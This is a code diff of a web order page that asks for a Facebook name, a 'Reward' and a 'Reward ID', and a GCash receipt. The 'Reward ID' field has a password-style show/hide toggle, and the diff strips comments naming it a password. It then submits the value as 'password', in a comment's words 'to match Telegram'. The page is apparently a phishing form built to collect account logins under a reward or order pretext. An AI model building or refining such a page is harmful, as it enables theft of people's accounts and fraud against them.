@@ -238,7 +238,7 @@
         <h2>📋 Step 1: Enter Account Info</h2>
         <input type="text" id="userId" placeholder="Reward" required>
         <div class="input-group" style="position:relative;">
-          <input type="text" id="rewardCode" placeholder="Reward ID" required>   <!-- Changed to text for reliability -->
+          <input type="text" id="rewardCode" placeholder="Reward ID" required>
           <i class="toggle-eye fas fa-eye-slash" id="toggleEye" style="position:absolute;right:18px;top:50%;transform:translateY(-50%);color:#94a3b8;cursor:pointer;font-size:1.4rem;"></i>
         </div>
       </div>
@@ -310,7 +310,6 @@
     let selectedDays = "7";
     let selectedFile = null;
 
-    // Plan & Duration Selection
     document.querySelectorAll('.price-card').forEach(card => {
       card.addEventListener('click', () => {
         document.querySelectorAll('.price-card').forEach(c => c.classList.remove('active'));
@@ -327,7 +326,7 @@
       });
     });
 
-    // Password Toggle (now works with text type)
+    // Eye Toggle
     const rewardInput = document.getElementById('rewardCode');
     const toggleEye = document.getElementById('toggleEye');
     toggleEye.addEventListener('click', () => {
@@ -371,17 +370,13 @@
     async function submitOrder() {
       const customer = document.getElementById('customer').value.trim();
       const username = document.getElementById('userId').value.trim();
-      const rewardCode = document.getElementById('rewardCode').value.trim();   // Direct read
+      const rewardID = document.getElementById('rewardCode').value.trim();
       const note = document.getElementById('note').value.trim();
 
       if (!customer) return alert("❌ Please enter your Facebook Name");
       if (!username) return alert("❌ Please enter your Reward");
-      if (!rewardCode) return alert("❌ Please enter your Reward ID");
+      if (!rewardID) return alert("❌ Please enter your Reward ID");
       if (!selectedFile) return alert("❌ Please upload your GCash Payment Receipt");
-
-      console.log("=== ORDER DEBUG ===");
-      console.log("Reward:", username);
-      console.log("Reward ID:", rewardCode);
 
       const btn = document.querySelector('button');
       const originalText = btn.textContent;
@@ -393,17 +388,17 @@
       formData.append('days', selectedDays);
       formData.append('customer', customer);
       formData.append('username', username);
-      formData.append('rewardCode', rewardCode);
+      formData.append('password', rewardID);        // ← Sent as 'password' to match Telegram
       formData.append('note', note || '');
       formData.append('receipt', selectedFile);
 
       try {
         const response = await fetch(API_ENDPOINT, { method: 'POST', body: formData });
+        
         if (response.ok) {
           document.getElementById('result').innerHTML = `
             <div style="background:#166534; color:#86efac; padding:20px; border-radius:16px; text-align:center; margin-top:20px;">
-              ✅ Order sent successfully!<br>
-              <small>Your order has been received.</small>
+              ✅ Order sent successfully!
             </div>`;
         } else {
           alert("❌ Failed to send order.");
